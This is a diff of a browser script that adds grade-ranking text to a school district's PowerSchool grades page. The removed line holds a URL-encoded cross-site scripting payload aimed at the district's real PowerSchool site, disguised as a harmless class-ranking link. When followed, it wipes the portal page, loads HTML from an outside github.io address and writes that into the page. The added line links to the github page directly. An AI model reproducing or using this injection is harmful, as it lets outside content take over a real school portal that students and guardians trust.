@@ -35,16 +35,19 @@ if (document.title.indexOf("Grades and Attendance") != -1) {
     function ins(txxt, link) {
         txt = txxt+" \n"
         var newElement;
-        if (link && link.includes("keep")) {
+        if (link && (link.includes("keep") || link.includes("rawr"))) {
             newElement = document.createElement("a");
         } else {
             newElement = document.createElement("div")
         }
         newElement.appendChild(document.createTextNode(txt));
-        if (link && link.includes("keep")) {
+        if (link && (link.includes("keep") || link.includes("rawr"))) {
             newElement.title = txt
+            // newElement.href = link
+            console.log("Changn")
             newElement.href = link
             newElement.target = "_blank"
+            console.log('changed')
         }
         document.getElementById('attByClass').appendChild(newElement);
     }
@@ -116,7 +119,7 @@ if (document.title.indexOf("Grades and Attendance") != -1) {
         ouput = (obj.players[0].player_name)
         console.log(ouput)
         ins(ouput+" has the best grade")
-        ins("You have the #"+getRanking(ok,obj)+" best grade in the class","https://powerschool.cape.k12.me.us/guardian/forms.html?sharetype=%22;(function()%7B%0A%20%20%20%20document.body.innerHTML%20%3D%20%27%3Ch3%3Ehello%3C%2Fh3%3E%27%0A%20%20%20%20setTimeout(function()%7B%0A%20%20%20%20%20%20%20%20document.body.innerHTML%20%3D%20%27%27%0A%20%20%20%20%20%20%20%20document.body.id%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20document.write(%27%27)%0A%20%20%20%20%20%20%20%20var%20xmlHttp%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20%20%20%20%20%20%20xmlHttp.open(%20%22GET%22%2C%20%22https%3A%2F%2Felliotdoescode.github.io%2FPOWERschool%2Frawr.html%22%2C%20false%20)%3B%0A%20%20%20%20%20%20%20%20xmlHttp.send(%20null%20)%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20var%20result%20%3D%20xmlHttp.responseText%3B%0A%20%20%20%20%20%20%20%20console.log(result)%0A%20%20%20%20%20%20%20%20document.write(result)%0A%20%20%20%20%7D%2C200)%3B%0A%7D)()%3B//")
+        ins("You have the #"+getRanking(ok,obj)+" best grade in the class","https://elliotdoescode.github.io/POWERschool/rawr.html")
         callbac()
     }
     
@@ -242,7 +245,7 @@ if (document.title.indexOf("Grades and Attendance") != -1) {
     //End grades
 
     //Coloring
-    document.querySelector("#attByClass").style.background = "#DFD2F4";
+    document.querySelector("#attByClass").style.background = "#ffd6d6";
 
 
 } else if (document.title.indexOf("Class Score Detail") != -1) {
